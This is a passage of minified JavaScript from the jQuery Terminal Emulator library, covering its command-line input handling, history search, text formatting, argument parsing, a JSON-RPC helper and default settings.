t},enable:function(){t=true},purge:function(){e.Storage.remove(i)},disable:function(){t=false}})}var v=function(){var e=document.createElement("div");e.setAttribute("onpaste","return;");return typeof e.onpaste=="function"}();var y=true;e.fn.cmd=function(r){var t=this;var i=t.data("cmd");if(i){return i}t.addClass("cmd");t.append('<span class="prompt"></span><span></span>'+'<span class="cursor">&nbsp;</span><span></span>');var o=e("<textarea>").addClass("clipboard").appendTo(t);if(r.width){t.width(r.width)}var a;var s;var l=t.find(".prompt");var f=false;var c="";var u=null;var h;var m=r.mask||false;var g="";var y;var _="";var w="";var C=0;var S;var T;var F=r.historySize||60;var E,A;var j=t.find(".cursor");var R;var $=0;function I(){var e=o.is(":focus");if(T){if(!e){o.focus();t.oneTime(10,function(){o.focus()})}}else{if(e){o.blur()}}}function z(){if(x){t.oneTime(10,function(){o.val(g);t.oneTime(10,function(){o.caret(C)})})}}if(b&&!k){R=function(e){if(e){j.addClass("blink")}else{j.removeClass("blink")}}}else{var O=false;R=function(e){if(e&&!O){O=true;j.addClass("inverted blink");t.everyTime(500,"blink",K)}else if(O&&!e){O=false;t.stopTime("blink",K);j.removeClass("inverted blink")}}}function K(e){j.toggleClass("inverted")}function N(){S="(reverse-i-search)`"+c+"': ";q()}function P(){S=h;f=false;u=null;c=""}function L(n){var r=A.data();var i,o;var a=r.length;if(n&&u>0){a-=u}if(c.length>0){for(var s=c.length;s>0;s--){o=e.terminal.escape_regex(c.substring(0,s));i=new RegExp(o);for(var l=a;l--;){if(i.test(r[l])){u=r.length-l;t.position(r[l].indexOf(o));t.set(r[l],true);H();if(c.length!==s){c=c.substring(0,s);N()}return}}}}c=""}function D(){var e=t.width();var n=j[0].getBoundingClientRect().width;a=Math.floor(e/n)}function B(e){var n=e.substring(0,a-s);var r=e.substring(a-s);return[n].concat(p(r,a))}var H=function(n){var r=j.prev();var t=j.next();function i(n,i){var o=n.length;if(i===o){r.html(e.terminal.encode(n));j.html("&nbsp;");t.html("")}else if(i===0){r.html("");j.html(e.terminal.encode(n.slice(0,1)));t.html(e.terminal.encode(n.slice(1)))}else{var a=n.slice(0,i);r.html(e.terminal.encode(a));var s=n.slice(i,i+1);j.html(e.terminal.encode(s));if(i===n.length-1){t.html("")}else{t.html(e.terminal.encode(n.slice(i+1)))}}}function o(n){return"<div>"+e.terminal.encode(n)+"</div>"}function l(n){var r=t;e.each(n,function(n,t){r=e(o(t)).insertAfter(r).addClass("clear")})}function f(n){e.each(n,function(e,n){r.before(o(n))})}var c=0;return function(){var c;var u;switch(typeof m){case"boolean":c=m?g.replace(/./g,"*"):g;break;case"string":c=g.replace(/./g,m);break}var h,d;n.find("div").remove();r.html("");if(c.length>a-s-1||c.match(/\n/)){var v;var y=c.match(/\t/g);var _=y?y.length*3:0;if(y){c=c.replace(/\t/g,"\x00\x00\x00\x00")}if(c.match(/\n/)){var w=c.split("\n");d=a-s-1;for(h=0;h<w.length-1;++h){w[h]+=" "}if(w[0].length>d){v=[w[0].substring(0,d)];u=w[0].substring(d);v=v.concat(p(u,a))}else{v=[w[0]]}for(h=1;h<w.length;++h){if(w[h].length>a){v=v.concat(p(w[h],a))}else{v.push(w[h])}}}else{v=B(c)}if(y){v=e.map(v,function(e){return e.replace(/\x00\x00\x00\x00/g,"	")})}d=v[0].length;if(d===0&&v.length===1){}else if(C<d){i(v[0],C);l(v.slice(1))}else if(C===d){r.before(o(v[0]));i(v[1],0);l(v.slice(2))}else{var b=v.length;var k=0;if(C<d){i(v[0],C);l(v.slice(1))}else if(C===d){r.before(o(v[0]));i(v[1],0);l(v.slice(2))}else{var x=v.slice(-1)[0];var S=c.length-C-_;var T=x.length;var F=0;if(S<=T){f(v.slice(0,-1));if(T===S){F=0}else{F=T-S}i(x,F)}else{if(b===3){u=e.terminal.encode(v[0]);r.before("<div>"+u+"</div>");i(v[1],C-d-1);u=e.terminal.encode(v[2]);t.after('<div class="clear">'+u+"</div>")}else{var E;var A;F=C;for(h=0;h<v.length;++h){var R=v[h].length;if(F>R){F-=R}else{break}}A=v[h];E=h;if(F===A.length){F=0;A=v[++E]}i(A,F);f(v.slice(0,E));l(v.slice(E+1))}}}}}else{if(c===""){r.html("");j.html("&nbsp;");t.html("")}else{i(c,C)}}}}(t);var q=function(){function n(n){l.html(e.terminal.format(e.terminal.encode(n)));s=l.text().length}return function(){switch(typeof S){case"string":n(S);break;case"function":S(n);break}}}();function J(e){if($++>0){return}if(e.originalEvent){e=e.originalEvent}if(t.isenabled()){var n=t.find("textarea");if(!n.is(":focus")){n.focus()}t.oneTime(100,function(){t.insert(n.val());n.val("");z()})}}var M=true;var U=false;var Y;function G(i){var a,s,l;if(T){if(e.isFunction(r.keydown)){a=r.keydown(i);if(a!==n){return a}}if(i.which!==38&&!(i.which===80&&i.ctrlKey)){M=true}if(f&&(i.which===35||i.which===36||i.which===37||i.which===38||i.which===39||i.which===40||i.which===13||i.which===27)){P();q();if(i.which===27){t.set("")}H();G.call(this,i)}else if(i.altKey){if(i.which===68){t.set(g.slice(0,C)+g.slice(C).replace(/ *[^ ]+ *(?= )|[^ ]+$/,""),true);return false}return true}else if(i.keyCode===13){if(i.shiftKey){t.insert("\n")}else{if(A&&g&&!m&&(e.isFunction(r.historyFilter)&&r.historyFilter(g))||r.historyFilter instanceof RegExp&&g.match(r.historyFilter)||!r.historyFilter){A.append(g)}var u=g;A.reset();t.set("");if(r.commands){r.commands(u)}if(e.isFunction(S)){q()}}}else if(i.which===8){if(f){c=c.slice(0,-1);N()}else{if(g!==""&&C>0){t["delete"](-1)}}if(x){return true}}else if(i.which===67&&i.ctrlKey&&i.shiftKey){_=W()}else if(i.which===86&&i.ctrlKey&&i.shiftKey){if(_!==""){t.insert(_)}}else if(i.which===9&&!(i.ctrlKey||i.altKey)){t.insert("	")}else if(i.which===46){t["delete"](1);return}else if(A&&(i.which===38&&!i.ctrlKey)||i.which===80&&i.ctrlKey){if(M){y=g;t.set(A.current())}else{t.set(A.previous())}M=false}else if(A&&(i.which===40&&!i.ctrlKey)||i.which===78&&i.ctrlKey){t.set(A.end()?y:A.next())}else if(i.which===37||i.which===66&&i.ctrlKey){if(i.ctrlKey&&i.which!==66){l=C-1;s=0;if(g[l]===" "){--l}for(var p=l;p>0;--p){if(g[p]===" "&&g[p+1]!==" "){s=p+1;break}else if(g[p]==="\n"&&g[p+1]!=="\n"){s=p;break}}t.position(s)}else{if(C>0){t.position(-1,true);H()}}}else if(i.which===82&&i.ctrlKey){if(f){L(true)}else{h=S;N();y=g;t.set("");H();f=true}}else if(i.which==71&&i.ctrlKey){if(f){S=h;q();t.set(y);H();f=false;c=""}}else if(i.which===39||i.which===70&&i.ctrlKey){if(i.ctrlKey&&i.which!==70){if(g[C]===" "){++C}var d=/\S[\n\s]{2,}|[\n\s]+\S?/;var b=g.slice(C).match(d);if(!b||b[0].match(/^\s+$/)){t.position(g.length)}else{if(b[0][0]!==" "){C+=b.index+1}else{C+=b.index+b[0].length-1;if(b[0][b[0].length-1]!==" "){--C}}}H()}else{if(C<g.length){t.position(1,true)}}}else if(i.which===123){return}else if(i.which===36){t.position(0)}else if(i.which===35){t.position(g.length)}else if(i.shiftKey&&i.which==45){o.val("");$=0;if(!v){J(i)}else{o.focus()}return}else if(i.ctrlKey||i.metaKey){if(i.which===192){return}if(i.metaKey){if(i.which===82){return}else if(i.which===76){return}}if(i.shiftKey){if(i.which===84){return}}else{if(i.which===81){if(g!==""&&C!==0){var k=g.slice(0,C).match(/([^ ]+ *$)/);w=t["delete"](-k[0].length)}return false}else if(i.which===72){if(g!==""&&C>0){t["delete"](-1)}return false}else if(i.which===65){t.position(0)}else if(i.which===69){t.position(g.length)}else if(i.which===88||i.which===67||i.which===84){return}else if(i.which===89){if(w!==""){t.insert(w)}}else if(i.which===86||i.which===118){o.val("");$=0;if(!v){J(i)}else{o.focus();o.on("input",function F(e){J(e);o.off("input",F)})}return}else if(i.which===75){w=t["delete"](g.length-C)}else if(i.which===85){if(g!==""&&C!==0){w=t["delete"](-C)}}else if(i.which===17){return false}}}else{U=false;Y=true;return}i.preventDefault()}}function Q(){if(e.isFunction(r.onCommandChange)){r.onCommandChange(g)}}e.extend(t,{name:function(e){if(e!==n){E=e;var r=A&&A.enabled()||!A;A=new d(e,F);if(!r){A.disable()}return t}else{return E}},purge:function(){A.clear();return t},history:function(){return A},"delete":function(e,n){var r;if(e===0){return t}else if(e<0){if(C>0){r=g.slice(0,C).slice(e);g=g.slice(0,C+e)+g.slice(C,g.length);if(!n){t.position(C+e)}else{Q()}}}else{if(g!==""&&C<g.length){r=g.slice(C).slice(0,e);g=g.slice(0,C)+g.slice(C+e,g.length);Q()}}H();z();return r},set:function(e,r){if(e!==n){g=e;if(!r){t.position(g.length)}H();z();Q()}return t},insert:function(e,n){if(C===g.length){g+=e}else if(C===0){g=e+g}else{g=g.slice(0,C)+e+g.slice(C)}if(!n){t.position(e.length,true)}else{z()}H();Q();return t},get:function(){return g},commands:function(e){if(e){r.commands=e;return t}else{return e}},destroy:function(){Z.unbind("keypress.cmd",V);Z.unbind("keydown.cmd",G);Z.unbind("paste.cmd",J);Z.unbind("input.cmd",ee);t.stopTime("blink",K);t.find(".cursor").next().remove().end().prev().remove().end().remove();t.find(".prompt, .clipboard").remove();t.removeClass("cmd").removeData("cmd");return t},prompt:function(e){if(e===n){return S}else{if(typeof e==="string"||typeof e==="function"){S=e}else{throw new Error("prompt must be a function or string")}q();H();return t}},kill_text:function(){return w},position:function(n,i){if(typeof n==="number"){if(i){C+=n}else{if(n<0){C=0}else if(n>g.length){C=g.length}else{C=n}}if(e.isFunction(r.onPositionChange)){r.onPositionChange(C)}H();z();return t}else{return C}},visible:function(){var e=t.visible;return function(){e.apply(t,[]);H();q()}}(),show:function(){var e=t.show;return function(){e.apply(t,[]);H();q()}}(),resize:function(e){if(e){a=e}else{D()}H();return t},enable:function(){T=true;t.addClass("enabled");R(true);I();return t},isenabled:function(){return T},disable:function(){T=false;t.removeClass("enabled");R(false);I();return t},mask:function(e){if(typeof e==="undefined"){return m}else{m=e;H();return t}}});t.name(r.name||r.prompt||"");if(typeof r.prompt=="string"){S=r.prompt}else{S="> "}q();if(r.enabled===n||r.enabled===true){t.enable()}var X;var Z=e(document.documentElement||window);function V(i){var o;Y=false;if((i.ctrlKey||i.metaKey)&&[99,118,86].indexOf(i.which)!==-1){return}if(U){return}if(!f&&e.isFunction(r.keypress)){o=r.keypress(i)}if(o===n||o){if(T){if(e.inArray(i.which,[38,13,0,8])>-1&&!(i.which===38&&i.shiftKey)){if(i.keyCode==123){return}return false}else if(!i.ctrlKey&&!(i.altKey&&i.which===100)||i.altKey){if(f){c+=String.fromCharCode(i.which);L();N()}else{t.insert(String.fromCharCode(i.which))}return false}}}else{return o}}function ee(e){if(Y){var n=o.val();if(n||e.which==8){t.set(n)}}}Z.bind("keypress.cmd",V).bind("keydown.cmd",G).bind("input.cmd",ee);t.data("cmd",t);return t};function _(n){return e("<div>"+e.terminal.strip(n)+"</div>").text().length}function w(e){return e.length-_(e)}var b=function(){var e=false,r="animation",t="",i="Webkit Moz O ms Khtml".split(" "),o="",a=document.createElement("div");if(a.style.animationName){e=true}if(e===false){for(var s=0;s<i.length;s++){var l=i[s]+"AnimationName";if(a.style[l]!==n){o=i[s];r=o+"Animation";t="-"+o.toLowerCase()+"-";e=true;break}}}return e}();var k=navigator.userAgent.toLowerCase().indexOf("android")!=-1;var x=function(){return"ontouchstart"in window||window.DocumentTouch&&document instanceof DocumentTouch}();function C(n,r){var t=r(n);if(t.length){var i=t.shift();var o=new RegExp("^"+e.terminal.escape_regex(i));var a=n.replace(o,"").trim();return{command:n,name:i,args:t,rest:a}}else{return{command:n,name:"",args:[],rest:""}}}var S=/(\[\[[!gbiuso]*;[^;]*;[^\]]*\](?:[^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]?)/i;var T=/\[\[([!gbiuso]*);([^;]*);([^;\]]*);?([^;\]]*);?([^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]?/gi;var F=/\[\[([!gbiuso]*;[^;\]]*;[^;\]]*(?:;|[^\]()]*);?[^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]?/gi;var E=/\[\[([!gbiuso]*;[^;\]]*;[^;\]]*(?:;|[^\]()]*);?[^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]/gi;var A=/^\[\[([!gbiuso]*;[^;\]]*;[^;\]]*(?:;|[^\]()]*);?[^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]$/gi;var j=/^#([0-9a-f]{3}|[0-9a-f]{6})$/i;var R=/(\bhttps?:\/\/(?:(?:(?!&[^;]+;)|(?=&amp;))[^\s"'<>\]\[)])+\b)/gi;var $=/\b(https?:\/\/(?:(?:(?!&[^;]+;)|(?=&amp;))[^\s"'<>\][)])+)\b(?![^[\]]*])/gi;var I=/((([^<>('")[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,})))/g;var z=/('[^']*'|"(\\"|[^"])*"|(?:\/(\\\/|[^\/])+\/[gimy]*)(?=:? |$)|(\\ |[^ ])+|[\w-]+)/gi;var O=/(\[\[[!gbiuso]*;[^;]*;[^\]]*\])/i;var K=/^(\[\[[!gbiuso]*;[^;]*;[^\]]*\])/i;var N=/\[\[[!gbiuso]*;[^;]*;[^\]]*\]?$/i;var P=/(\[\[(?:[^\]]|\\\])*\]\])/;e.terminal={version:"0.11.12",color_names:["black","silver","gray","white","maroon","red","purple","fuchsia","green","lime","olive","yellow","navy","blue","teal","aqua","aliceblue","antiquewhite","aqua","aquamarine","azure","beige","bisque","black","blanchedalmond","blue","blueviolet","brown","burlywood","cadetblue","chartreuse","chocolate","coral","cornflowerblue","cornsilk","crimson","cyan","darkblue","darkcyan","darkgoldenrod","darkgray","darkgreen","darkgrey","darkkhaki","darkmagenta","darkolivegreen","darkorange","darkorchid","darkred","darksalmon","darkseagreen","darkslateblue","darkslategray","darkslategrey","darkturquoise","darkviolet","deeppink","deepskyblue","dimgray","dimgrey","dodgerblue","firebrick","floralwhite","forestgreen","fuchsia","gainsboro","ghostwhite","gold","goldenrod","gray","green","greenyellow","grey","honeydew","hotpink","indianred","indigo","ivory","khaki","lavender","lavenderblush","lawngreen","lemonchiffon","lightblue","lightcoral","lightcyan","lightgoldenrodyellow","lightgray","lightgreen","lightgrey","lightpink","lightsalmon","lightseagreen","lightskyblue","lightslategray","lightslategrey","lightsteelblue","lightyellow","lime","limegreen","linen","magenta","maroon","mediumaquamarine","mediumblue","mediumorchid","mediumpurple","mediumseagreen","mediumslateblue","mediumspringgreen","mediumturquoise","mediumvioletred","midnightblue","mintcream","mistyrose","moccasin","navajowhite","navy","oldlace","olive","olivedrab","orange","orangered","orchid","palegoldenrod","palegreen","paleturquoise","palevioletred","papayawhip","peachpuff","peru","pink","plum","powderblue","purple","red","rosybrown","royalblue","saddlebrown","salmon","sandybrown","seagreen","seashell","sienna","silver","skyblue","slateblue","slategray","slategrey","snow","springgreen","steelblue","tan","teal","thistle","tomato","turquoise","violet","wheat","white","whitesmoke","yellow","yellowgreen"],valid_color:function(n){if(n.match(j)){return true}else{return e.inArray(n.toLowerCase(),e.terminal.color_names)!==-1}},escape_regex:function(e){if(typeof e=="string"){var n=/([-\\\^$\[\]()+{}?*.|])/g;return e.replace(n,"\\$1")}},have_formatting:function(e){return typeof e=="string"&&!!e.match(E)},is_formatting:function(e){return typeof e=="string"&&!!e.match(A)},format_split:function(e){return e.split(S)},split_equal:function(n,r,t){var i=false;var o=false;var a="";var s=[];var l=n.replace(F,function(e,n,r){var t=n.match(/;/g).length;if(t>=4){return e}else if(t==2){t=";;"}else if(t==3){t=";"}else{t=""}var i=r.replace(/\\\]/g,"&#93;").replace(/\n/g,"\\n").replace(/&nbsp;/g," ");return"[["+n+t+i+"]"+r+"]"}).split(/\n/g);function f(){return h.substring(d-6,d)=="&nbsp;"||h.substring(d-1,d)==" "}for(var c=0,u=l.length;c<u;++c){if(l[c]===""){s.push("");continue}var h=l[c];var p=0;var m=0;var g=-1;for(var d=0,v=h.length;d<v;++d){if(h.substring(d).match(K)){i=true;o=false}else if(i&&h[d]==="]"){if(o){i=false;o=false}else{o=true}}else if(i&&o||!i){if(h[d]==="&"){var y=h.substring(d).match(/^(&[^;]+;)/);if(!y){throw new Error("Unclosed html entity in line "+(c+1)+" at char "+(d+1))}d+=y[1].length-2;if(d===v-1){s.push(_+y[1])}continue}else if(h[d]==="]"&&h[d-1]==="\\"){--m}else{++m}}if(f()&&(i&&o||!i||h[d]==="["&&h[d+1]==="[")){g=d}if((m===r||d===v-1)&&(i&&o||!i)){var _;var w=e.terminal.strip(h.substring(g));w=e("<span>"+w+"</span>").text();var b=w.length;w=w.substring(0,d+r+1);var k=!!w.match(/\s/)||d+r+1>b;if(t&&g!=-1&&d!==v-1&&k){_=h.substring(p,g);d=g-1}else{_=h.substring(p,d+1)}if(t){_=_.replace(/(&nbsp;|\s)+$/g,"")}g=-1;p=d+1;m=0;if(a){_=a+_;if(_.match("]")){a=""}}var x=_.match(F);if(x){var C=x[x.length-1];if(C[C.length-1]!=="]"){a=C.match(O)[1];_+="]"}else if(_.match(N)){var S=_.length;_=_.replace(N,"");a=C.match(O)[1]}}s.push(_)}}}return s},encode:function(e){e=e.replace(/&(?!#[0-9]+;|[a-zA-Z]+;)/g,"&amp;");return e.replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/ /g,"&nbsp;").replace(/\t/g,"&nbsp;&nbsp;&nbsp;&nbsp;")},escape_formatting:function(n){return e.terminal.escape_brackets(e.terminal.encode(n))},format:function(n,r){var t=e.extend({},{linksNoReferrer:false},r||{});if(typeof n==="string"){var i=e.terminal.format_split(n);n=e.map(i,function(n){if(n===""){return n}else if(e.terminal.is_formatting(n)){n=n.replace(/\[\[[^\]]+\]/,function(e){return e.replace(/&nbsp;/g," ")});return n.replace(T,function(n,r,i,o,a,s,l){if(l===""){return""}l=l.replace(/\\]/g,"]");var f="";if(r.indexOf("b")!==-1){f+="font-weight:bold;"}var c=[];if(r.indexOf("u")!==-1){c.push("underline")}if(r.indexOf("s")!==-1){c.push("line-through")}if(r.indexOf("o")!==-1){c.push("overline")}if(c.length){f+="text-decoration:"+c.join(" ")+";"}if(r.indexOf("i")!==-1){f+="font-style:italic;"}if(e.terminal.valid_color(i)){f+="color:"+i+";";if(r.indexOf("g")!==-1){f+="text-shadow:0 0 5px "+i+";"}}if(e.terminal.valid_color(o)){f+="background-color:"+o}var u;if(s===""){u=l}else{u=s.replace(/&#93;/g,"]")}var h;if(r.indexOf("!")!==-1){if(u.match(I)){h='<a href="mailto:'+u+'" '}else{h='<a target="_blank" href="'+u+'" ';if(t.linksNoReferrer){h+='rel="noreferrer" '}}}else{h="<span"}if(f!==""){h+=' style="'+f+'"'}if(a!==""){h+=' class="'+a+'"'}if(r.indexOf("!")!==-1){h+=">"+l+"</a>"}else{h+=' data-text="'+u.replace('"',"&quote;")+'">'+l+"</span>"}return h})}else{return"<span>"+n.replace(/\\\]/g,"]")+"</span>"}}).join("");return n.replace(/<span><br\s*\/?><\/span>/gi,"<br/>")}else{return""}},escape_brackets:function(e){return e.replace(/\[/g,"&#91;").replace(/\]/g,"&#93;")},strip:function(e){return e.replace(T,"$6")},active:function(){return Z.front()},last_id:function(){var e=Z.length();if(e){return e-1}},parseArguments:function(n){return e.terminal.parse_arguments(n)},splitArguments:function(n){return e.terminal.split_arguments(n)},parseCommand:function(n){return e.terminal.parse_command(n)},splitCommand:function(n){return e.terminal.split_command(n)},parse_arguments:function(n){var r=/^[-+]?[0-9]*\.?[0-9]+([eE][-+]?[0-9]+)?$/;return e.map(n.match(z)||[],function(e){if(e[0]==="'"&&e[e.length-1]==="'"){return e.replace(/^'|'$/g,"")}else if(e[0]==='"'&&e[e.length-1]==='"'){e=e.replace(/^"|"$/g,"").replace(/\\([" ])/g,"$1");return e.replace(/\\\\|\\t|\\n/g,function(e){if(e[1]==="t"){return"	"}else if(e[1]==="n"){return"\n"}else{return"\\"}}).replace(/\\x([0-9a-f]+)/gi,function(e,n){return String.fromCharCode(parseInt(n,16))}).replace(/\\0([0-7]+)/g,function(e,n){return String.fromCharCode(parseInt(n,8))})}else if(e.match(/^\/(\\\/|[^\/])+\/[gimy]*$/)){var n=e.match(/^\/([^\/]+)\/([^\/]*)$/);return new RegExp(n[1],n[2])}else if(e.match(/^-?[0-9]+$/)){return parseInt(e,10)}else if(e.match(r)){return parseFloat(e)}else{return e.replace(/\\ /g," ")}})},split_arguments:function(n){return e.map(n.match(z)||[],function(e){if(e[0]==="'"&&e[e.length-1]==="'"){return e.replace(/^'|'$/g,"")}else if(e[0]==='"'&&e[e.length-1]==='"'){return e.replace(/^"|"$/g,"").replace(/\\([" ])/g,"$1")}else if(e.match(/\/.*\/[gimy]*$/)){return e}else{return e.replace(/\\ /g," ")}})},parse_command:function(n){return C(n,e.terminal.parse_arguments)},split_command:function(n){return C(n,e.terminal.split_arguments)},extended_command:function(e,n){try{ne=false;e.exec(n,true).then(function(){ne=true})}catch(r){}}};e.fn.visible=function(){return this.css("visibility","visible")};e.fn.hidden=function(){return this.css("visibility","hidden")};var L={};e.jrpc=function(n,r,t,i,o){L[n]=L[n]||0;var a=e.json_stringify({jsonrpc:"2.0",method:r,params:t,id:++L[n]});return e.ajax({url:n,data:a,success:function(n,r,t){var a=t.getResponseHeader("Content-Type");if(!a.match(/application\/json/)){var s="Response Content-Type is not application/json";if(console&&console.warn){console.warn(s)}else{throw new Error("WARN: "+s)}}var l;try{l=e.parseJSON(n)}catch(f){if(o){o(t,"Invalid JSON",f)}else{throw new Error("Invalid JSON")}return}i(l,r,t)},error:o,contentType:"application/json",dataType:"text",async:true,cache:false,type:"POST"})};function D(){var n=e('<div class="terminal temp"><div class="cmd"><span cla'+'ss="cursor">&nbsp;</span></div></div>').appendTo("body");var r=n.find("span");var t={width:r.width(),height:r.outerHeight()};n.remove();return t}function B(n){var r=e('<div class="terminal wrap"><span class="cursor">'+"&nbsp;</span></div>").appendTo("body").css("padding",0);var t=r.find("span");var i=t[0].getBoundingClientRect().width;var o=Math.floor(n.width()/i);r.remove();if(q(n)){var a=20;var s=n.innerWidth()-n.width();o-=Math.ceil((a-s/2)/(i-1))}return o}function H(e){return Math.floor(e.height()/D().height)}function W(){if(window.getSelection||document.getSelection){var e=(window.getSelection||document.getSelection)();if(e.text){return e.text}else{return e.toString()}}else if(document.selection){return document.selection.createRange().text}}function q(n){if(n.css("overflow")=="scroll"||n.css("overflow-y")=="scroll"){return true}else if(n.is("body")){return e("body").height()>e(window).height()}else{return n.get(0).scrollHeight>n.innerHeight()}}var J=!e.terminal.version.match(/^\{\{/);var M="Copyright (c) 2011-2016 Jakub Jankiewicz <http://jcubic"+".pl>";var U=J?" v. "+e.terminal.version:" ";var Y=new RegExp(" {"+U.length+"}$");var G="jQuery Terminal Emulator"+(J?U:"");var Q=[["jQuery Terminal","(c) 2011-2016 jcubic"],[G,M.replace(/^Copyright | *<.*>/g,"")],[G,M.replace(/^Copyright /,"")],["      _______                 ________                        __","     / / _  /_ ____________ _/__  ___/______________  _____  / /"," __ / / // / // / _  / _/ // / / / _  / _/     / /  \\/ / _ \\/ /","/  / / // / // / ___/ // // / / / ___/ // / / / / /\\  / // / /__","\\___/____ \\\\__/____/_/ \\__ / /_/____/_//_/_/_/ /_/  \\/\\__\\_\\___/","         \\/          /____/                                   ".replace(Y," ")+U,M],["      __ _____                     ________                              __","     / // _  /__ __ _____ ___ __ _/__  ___/__ ___ ______ __ __  __ ___  / /"," __ / // // // // // _  // _// // / / // _  // _//     // //  \\/ // _ \\/ /","/  / // // // // // ___// / / // / / // ___// / / / / // // /\\  // // / /__","\\___//____ \\\\___//____//_/ _\\_  / /_//____//_/ /_/ /_//_//_/ /_/ \\__\\_\\___/","          \\/              /____/                                          ".replace(Y,"")+U,M]];

                e.terminal.defaults={prompt:"> ",history:true,exit:true,clear:true,enabled:true,historySize:60,maskChar:"*",checkArity:true,raw:false,exceptionHandler:null,cancelableAjax:true,processArguments:true,linksNoReferrer:false,processRPCResponse:null,Token:true,convertLinks:true,historyState:false,echoCommand:true,scrollOnEcho:true,login:null,outputLimit:-1,formatters:[],onAjaxError:null,onRPCError:null,completion:false,historyFilter:null,onInit:e.noop,onClear:e.noop,onBlur:e.noop,onFocus:e.noop,onTerminalChange:e.noop,onExit:e.noop,keypress:e.noop,keydown:e.noop,strings:{wrongPasswordTryAgain:"Wrong password try again!",wrongPassword:"Wrong password!",ajaxAbortError:"Error while aborting ajax call!",wrongArity:"Wrong number of arguments. Function '%s' expects %s got"+" %s!",commandNotFound:"Command '%s' Not Found!",oneRPCWithIgnore:"You can use only one rpc with ignoreSystemDescr"+"ibe",oneInterpreterFunction:"You can't use more than one function (rpc"+"with ignoreSystemDescribe counts as one)",loginFunctionMissing:"You didn't specify a login function",noTokenError:"Access denied (no token)",serverResponse:"Server responded",wrongGreetings:"Wrong value of greetings parameter",notWhileLogin:"You can't call `%s' function while in login",loginIsNotAFunction:"Authenticate must be a function",canExitError:"You can't exit from main interpreter",invalidCompletion:"Invalid completion",invalidSelector:'Sorry, but terminal said that "%s" is not valid '+"selector!",invalidTerminalId:"Invalid Terminal ID",login:"login",password:"password",recursiveCall:"Recursive call detected, skip"}};var X=[];var Z=new m;var V=[];var ee;var ne=false;var re=true;var te=true;var ie;e.fn.terminal=function(r,i){function o(n){if(e.isFunction(Te.processArguments)){return C(n,Te.processArguments)}else if(Te.processArguments){return e.terminal.parse_command(n)}else{return e.terminal.split_command(n)}}function a(n){if(typeof n==="string"){se.echo(n)}else if(n instanceof Array){se.echo(e.map(n,function(n){return e.json_stringify(n)}).join(" "))}else if(typeof n==="object"){se.echo(e.json_stringify(n))}else{se.echo(n)}}function s(n){var r=/(.*):([0-9]+):([0-9]+)$/;var t=n.match(r);if(t){se.pause();e.get(t[1],function(n){var r=location.href.replace(/[^\/]+$/,"");var i=t[1].replace(r,"");se.echo("[[b;white;]"+i+"]");var o=n.split("\n");var a=+t[2]-1;se.echo(o.slice(a-2,a+3).map(function(n,r){if(r==2){n="[[;#f00;]"+e.terminal.escape_brackets(n)+"]"}return"["+(a+r)+"]: "+n}).join("\n")).resume()},"text")}}function l(n){if(e.isFunction(Te.onRPCError)){Te.onRPCError.call(se,n)}else{se.error("&#91;RPC&#93; "+n.message);if(n.error&&n.error.message){n=n.error;var r="	"+n.message;if(n.file){r+=' in file "'+n.file.replace(/.*\//,"")+'"'}if(n.at){r+=" at line "+n.at}se.error(r)}}}function f(n,r){var t=function(r,t){se.pause();e.jrpc(n,r,t,function(n){if(n.error){l(n.error)}else{if(e.isFunction(Te.processRPCResponse)){Te.processRPCResponse.call(se,n.result,se)}else{a(n.result)}}se.resume()},u)};return function(e,n){if(e===""){return}try{e=o(e)}catch(i){n.error(i.toString());return}if(!r||e.name==="help"){t(e.name,e.args)}else{var a=n.token();if(a){t(e.name,[a].concat(e.args))}else{n.error("&#91;AUTH&#93; "+Fe.noTokenError)}}}}function c(r,t,i,a){return function(s,l){if(s===""){return}var f;try{f=o(s)}catch(u){se.error(u.toString());return}var h=r[f.name];var p=e.type(h);if(p==="function"){if(t&&h.length!==f.args.length){se.error("&#91;Arity&#93; "+sprintf(Fe.wrongArity,f.name,h.length,f.args.length))}else{return h.apply(se,f.args)}}else if(p==="object"||p==="string"){var m=[];if(p==="object"){m=Object.keys(h);h=c(h,t,i)}l.push(h,{prompt:f.name+"> ",name:f.name,completion:p==="object"?m:n})}else{if(e.isFunction(a)){a(s,se)}else if(e.isFunction(Te.onCommandNotFound)){Te.onCommandNotFound(s,se)}else{l.error(sprintf(Fe.commandNotFound,f.name))}}}}function u(n,r,t){se.resume();if(e.isFunction(Te.onAjaxError)){Te.onAjaxError.call(se,n,r,t)}else if(r!=="abort"){se.error("&#91;AJAX&#93; "+r+" - "+Fe.serverResponse+": \n"+e.terminal.escape_brackets(n.responseText))}}function h(n,r,t){e.jrpc(n,"system.describe",[],function(i){var o=[];if(i.procs){var s={};e.each(i.procs,function(t,i){s[i.name]=function(){var t=r&&i.name!="help";var o=Array.prototype.slice.call(arguments);var s=o.length+(t?1:0);if(Te.checkArity&&i.params&&i.params.length!==s){se.error("&#91;Arity&#93; "+sprintf(Fe.wrongArity,i.name,i.params.length,s))}else{se.pause();if(t){var f=se.token(true);if(f){o=[f].concat(o)}else{se.error("&#91;AUTH&#93; "+Fe.noTokenError)}}e.jrpc(n,i.name,o,function(n){if(n.error){l(n.error)}else{if(e.isFunction(Te.processRPCResponse)){Te.processRPCResponse.call(se,n.result,se)}else{a(n.result)}}se.resume()},u)}}});s.help=s.help||function(n){if(typeof n=="undefined"){se.echo("Available commands: "+i.procs.map(function(e){return e.name}).join(", ")+", help")}else{var r=false;e.each(i.procs,function(e,t){if(t.name==n){r=true;var i="";i+="[[bu;#fff;]"+t.name+"]";if(t.params){i+=" "+t.params.join(" ")}if(t.help){i+="\n"+t.help}se.echo(i);return false}});if(!r){if(n=="help"){se.echo("[[bu;#fff;]help] [method]\ndisplay help "+"for the method or list of methods if not"+" specified")}else{var t="Method `"+n.toString()+"' not found ";se.error(t)}}}};t(s)}else{t(null)}},function(){t(null)})}function p(n,r,t){t=t||e.noop;var i=e.type(n);var o;var a={};var s=0;var l;if(i==="array"){o={};(function 